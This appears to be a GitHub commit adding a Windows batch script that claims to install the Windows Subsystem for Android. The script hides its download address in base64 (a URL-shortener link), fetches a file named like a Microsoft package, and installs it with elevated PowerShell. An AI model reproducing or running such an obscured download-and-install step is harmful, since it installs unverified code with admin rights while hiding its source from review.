c91c5aaef1bf3037df2106dda3b9ca5f8243ad7a
Nazky <56560636+Nazky@users.noreply.github.com>
2021-10-21 23:50:03 +0200

    Create ForcedAndroidW11.bat

---
+++ ForcedAndroidW11.bat
@@ -0,0 +1,32 @@
+@echo off
+title ForcedAndroidW11
+echo ---------------------------------
+echo -        ForcedAndroidW11       -
+echo -  A script to install the WSA  -
+echo -         ONLY FOR W11          -
+echo ---------------------------------
+echo -          By @NazkyYT          -
+echo ---------------------------------
+
+
+
+echo.
+echo.
+
+pause
+
+powershell [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9iaXQubHkvM20wbUhWVA==')) > output
+
+set /p url=<output
+
+powershell Invoke-WebRequest %url% -o MicrosoftCorporationII.WindowsSubsystemForAndroid_1.7.32815.0_neutral_~_8wekyb3d8bbwe.msixbundle
+
+echo Download Finish
+
+del output
+
+powershell Start-Process powershell -Verb runAs Add-AppxPackage -Path MicrosoftCorporationII.WindowsSubsystemForAndroid_1.7.32815.0_neutral_~_8wekyb3d8bbwe.msixbundle
+
+echo Package Install
+
+pause
